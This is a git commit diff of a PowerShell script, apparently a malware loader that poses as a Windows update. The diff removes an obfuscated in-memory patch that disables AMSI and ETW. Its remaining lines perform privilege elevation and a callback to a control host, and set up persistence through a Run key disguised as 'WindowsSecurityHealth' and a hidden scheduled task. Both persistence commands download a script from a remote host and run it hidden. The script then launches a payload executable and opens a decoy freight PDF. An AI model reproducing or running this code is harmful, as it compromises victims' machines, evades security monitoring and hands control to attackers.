6df7f29d08999dd0f4bba552b3b16586ae16f6e9
unknown <Metro-movers1@outlook.com>
2026-07-02 22:44:16 +0000

    jimmy6

--- updatemspuls.ps1
+++ updatemspuls.ps1
@@ -28,53 +28,6 @@ function _cb($stage,$status,$detail){
 _log "S0: pid=$pid, u=$env:USERNAME, h=$cbHost"
 _cb 'S0' 'ok' "pid=$pid, u=$env:USERNAME, h=$cbHost"
 
-# AMSI+ETW patch
-$k='ker';$kb='nel32.dll'
-$Dm=[AppDomain]::CurrentDomain
-$Da=New-Object System.Reflection.AssemblyName('W')
-$Ab=$Dm.DefineDynamicAssembly($Da,[System.Reflection.Emit.AssemblyBuilderAccess]::Run)
-$Mb=$Ab.DefineDynamicModule('M',$false)
-$Tb=$Mb.DefineType('W','Public,Class')
-$Dll=[System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
-$FldSL=[System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
-$FldEP=[System.Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint')
-$FldCS=[System.Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
-$Flds=[System.Reflection.FieldInfo[]]@($FldSL,$FldEP,$FldCS)
-$csUni=[System.Runtime.InteropServices.CharSet]::Unicode
-$csAnsi=[System.Runtime.InteropServices.CharSet]::Ansi
-$ka=@($k+$kb)
-$u32ref=[UInt32].MakeByRefType()
-$uptr6=New-Object UIntPtr(6)
-
-$m0=$Tb.DefineMethod('LL','Public,Static',[IntPtr],@([String]))
-$m0.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'LoadLibraryW',$csUni))))
-$m1=$Tb.DefineMethod('GA','Public,Static',[IntPtr],@([IntPtr],[String]))
-$m1.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'GetProcAddress',$csAnsi))))
-$m2=$Tb.DefineMethod('VP','Public,Static',[bool],@([IntPtr],[UIntPtr],[UInt32],$u32ref))
-$m2.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'VirtualProtect',$csAnsi))))
-$W=$Tb.CreateType()
-
-[byte[]]$p6=@(0xB8,0x00,0x00,0x00,0x00,0xC3)
-
-try{
-    $nd='ntd';$ndb='ll.dll'
-    $nt=$W::LL($nd+$ndb)
-    if($nt -ne [IntPtr]::Zero){
-        $ew=$W::GA($nt,[char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101)
-        if($ew -ne [IntPtr]::Zero){$o=[UInt32]0;$W::VP($ew,$uptr6,0x40,[ref]$o)|Out-Null;[Runtime.InteropServices.Marshal]::Copy($p6,0,$ew,6);$W::VP($ew,$uptr6,$o,[ref]$o)|Out-Null}
-        $ewt=$W::GA($nt,[char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101+[char]84+[char]114+[char]97+[char]110+[char]115+[char]102+[char]101+[char]114)
-        if($ewt -ne [IntPtr]::Zero){$o=[UInt32]0;$W::VP($ewt,$uptr6,0x40,[ref]$o)|Out-Null;[Runtime.InteropServices.Marshal]::Copy($p6,0,$ewt,6);$W::VP($ewt,$uptr6,$o,[ref]$o)|Out-Null}
-    }
-    $ad='ams';$adb='i.dll'
-    $am=$W::LL($ad+$adb)
-    if($am -ne [IntPtr]::Zero){
-        $sb=$W::GA($am,[char]65+[char]109+[char]115+[char]105+[char]83+[char]99+[char]97+[char]110+[char]66+[char]117+[char]102+[char]102+[char]101+[char]114)
-        if($sb -ne [IntPtr]::Zero){$o=[UInt32]0;$W::VP($sb,$uptr6,0x40,[ref]$o)|Out-Null;[Runtime.InteropServices.Marshal]::Copy($p6,0,$sb,6);$W::VP($sb,$uptr6,$o,[ref]$o)|Out-Null}
-    }
-    _log 'S0: p ok'
-}catch{ _log 'S0: p err' }
-
-# admin check
 try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
 _log "S1: a=$cbIsAdmin"
 _cb 'S1' 'ok' "is_admin=$cbIsAdmin"
@@ -125,7 +78,6 @@ function _runArg($n,$a,$s,$l){
     }
 }
 
-
 if(-not $cbIsAdmin){
     _run 'ElevatorShellCode.exe' 'S1' 'elev'
     Start-Sleep 6
@@ -133,7 +85,6 @@ if(-not $cbIsAdmin){
     _log "S1: a=$cbIsAdmin"
     if($cbIsAdmin){_cb 'S1' 'ok' 'elevation ok'}else{_cb 'S1' 'warn' 'elevation fail'}
 }
-
 
 if($cbIsAdmin){
     try{
@@ -159,8 +110,7 @@ if($cbIsAdmin){
     _cb 'S2' 'skip' 'no admin'
 }
 
-
-$persistCmd="cmd.exe /c bitsadmin /transfer ps1 /download /priority high $gh/updatemspuls.ps1 %TEMP%\\u.ps1 && powershell -w hidden -NoP -file %TEMP%\\u.ps1"
+$persistCmd="cmd.exe /c bitsadmin /transfer ps1 /download /priority high $gh/updatemspul.ps1 %TEMP%\\u.ps1 && powershell -w hidden -NoP -file %TEMP%\\u.ps1"
 try{
     $rk='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
     Set-ItemProperty -Path $rk -Name 'WindowsSecurityHealth' -Value $persistCmd -Force -ErrorAction SilentlyContinue
@@ -181,7 +131,7 @@ if($cbIsAdmin){
 <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger><BootTrigger><Enabled>true</Enabled></BootTrigger><CalendarTrigger><StartBoundary>2024-01-01T00:00:00</StartBoundary><Repetition><Interval>PT4H</Interval></Repetition><Enabled>true</Enabled></CalendarTrigger></Triggers>
 <Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
 <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings>
-<Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-w hidden -NoP -c "`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(\"`$env:TEMP\\u.ps1\",`$w.DownloadData('$gh/updatemspuls.ps1'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1"</Arguments></Exec></Actions>
+<Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-w hidden -NoP -c "`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(\"`$env:TEMP\\u.ps1\",`$w.DownloadData('$gh/updatemspul.ps1'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1"</Arguments></Exec></Actions>
 </Task>
 "@
     $xmlPath="$env:TEMP\task.xml"
@@ -192,9 +142,7 @@ if($cbIsAdmin){
 
 _cb 'S3' 'ok' 'persist ok'
 
-
 _run 'PatchPulsaar.exe' 'S5' 'payload'
-
 
 $pdf='Rate_Confirmation_LD-2026-0847.pdf'
 $pdfPath="$env:USERPROFILE\Downloads\$pdf"
@@ -204,7 +152,6 @@ if($pdfBytes){
     try{Start-Process $pdfPath;_cb 'S7' 'ok' 'pdf ok'}catch{_cb 'S7' 'warn' 'pdf open fail'}
 }else{_cb 'S7' 'warn' 'pdf dl fail'}
 
-# CLEANUP
 Start-Sleep 5
 Remove-Item "$env:TEMP\u.ps1" -Force -ErrorAction SilentlyContinue
 $sp=$MyInvocation.MyCommand.Path
